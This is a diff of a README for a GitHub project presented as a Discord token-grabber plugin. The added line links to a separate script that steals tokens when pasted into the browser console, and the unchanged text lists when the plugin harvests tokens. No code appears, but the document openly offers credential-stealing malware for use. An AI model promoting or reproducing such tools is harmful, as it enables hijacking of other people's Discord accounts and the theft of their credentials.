@@ -3,6 +3,8 @@
 [![](https://www.codefactor.io/repository/github/HideakiAtsuyo/BetterGrabber/badge)](https://www.codefactor.io/repository/github/HideakiAtsuyo/BetterGrabber)<br>
 Better Discord Tokens Grabber Plugin
 
+If you want to token grab with a little script to paste in your console(less infos but can be updated) => [CLICK HERE](https://github.com/HideakiAtsuyo/Discord-Token-Grabber-Console-Script)
+
 # Grab When
 - Load Discord
 - Enable the Plugin if you modify the state (enabled/disabled)
